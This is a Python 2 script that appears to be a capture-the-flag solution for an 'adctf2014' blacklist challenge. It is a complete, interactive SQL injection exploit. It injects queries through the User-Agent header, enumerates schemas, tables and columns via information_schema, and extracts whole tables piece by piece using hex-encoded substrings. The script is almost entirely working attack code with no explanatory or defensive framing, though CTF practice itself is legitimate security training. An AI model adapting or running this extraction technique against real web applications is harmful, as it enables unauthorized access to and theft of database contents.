import urllib2
from time import sleep

URI = 'http://blacklist.adctf2014.katsudon.org/'

def communicate(code):
    req = urllib2.Request(URI, None, {'User-agent':"'+(%s)+'" % code})
    res = urllib2.urlopen(req)
    sleep(1)
    return res.read().split('\n')[10]

def SQLinjection(items):
    sql = "select length(group_concat(%s)) from (select %s from %s %s %s) sub" % (items['column'],items['column'],items['table'],('where '+items['where'] if 'where' in items else ''),(items['others'] if 'others' in items else ''))
    #print sql
    new_entry = communicate(sql)

    DATA=''
    for i in range(1,int(new_entry.split('"')[1])+1,5):
        sql = "conv(hex((select substr(group_concat(col),%d,5) from (select concat(%s) as col from %s %s %s) sub )),16,10)" % (i,items['column'],items['table'],('where '+items['where'] if 'where' in items else ''),(items['others'] if 'others' in items else ''))
        #print sql
        data = int(communicate(sql).split('"')[1])
        DATA += hex(data)[2:-1 if 'L' in hex(data) else None].decode('hex')
    return DATA.split(',')

def getSchema():
    items = {'column':"schema_name",'table':"information_schema.schemata"}
    return SQLinjection(items)

def getTables(TABLE_SCHEMA):
    items = {'column':"table_name",'table':"information_schema.tables",'where':"table_schema='%s'" % TABLE_SCHEMA}
    #items = {'column':"table_name",'table':"information_schema.tables",'others':"limit 5,1"}
    return SQLinjection(items)
    
def getColumns(TABLE_SCHEMA,TABLE_NAME):
    items = {'column':"column_name",'table':"information_schema.columns",'where':"table_schema='%s' and table_name='%s'" % (TABLE_SCHEMA,TABLE_NAME)}
    return SQLinjection(items)

def dump(TABLE_NAME,COLUMN_NAME,OTHERS):
    items = {'column':COLUMN_NAME,'table':TABLE_NAME,'others':OTHERS}
    return SQLinjection(items)

def dump_all(TABLE_SCHEMA,TABLE_NAME):
    All_Columns = getColumns(TABLE_SCHEMA,TABLE_NAME)
    print 'Columns\t: '+str(All_Columns)
    
    sql = "select table_rows from information_schema.tables where table_schema='%s' and table_name='%s'" % (TABLE_SCHEMA,TABLE_NAME)
    length = communicate(sql).split('"')[1]
    print length+' entries exist'

    if TABLE_NAME=='access_log':
        print "You can't insert 'access_log' table..."
    else:
        for i in range(int(length)):
            print dump(TABLE_SCHEMA+"."+TABLE_NAME,",".join(["`"+column+"`" for column in All_Columns]),"limit %d,1" % i)


if __name__ == '__main__':
    All_Schema = getSchema()
    print 'Schema\t: '+str(All_Schema)
    schema=raw_input('>>')

    if schema in All_Schema:
        All_Tables = getTables(schema)
        print 'Tables\t: '+str(All_Tables)
        table=raw_input('>>')
    
        if table in All_Tables:
            dump_all(schema,table)
        else:
            print "Table '"+table+"' doesn't exist."

    else:
        print "Schema '"+schema+"' doesn't exist."

    raw_input('Press any key to exit...')
